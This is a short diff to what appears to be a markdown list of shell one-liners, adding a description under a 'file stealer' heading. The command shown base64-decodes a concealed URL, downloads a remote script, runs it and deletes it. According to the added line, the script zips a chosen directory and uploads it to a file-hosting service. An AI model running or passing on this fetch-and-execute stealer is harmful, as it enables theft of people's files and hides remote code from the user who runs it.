@@ -56,3 +56,4 @@
 
 ### file stealer
 ```bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'```
+(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)
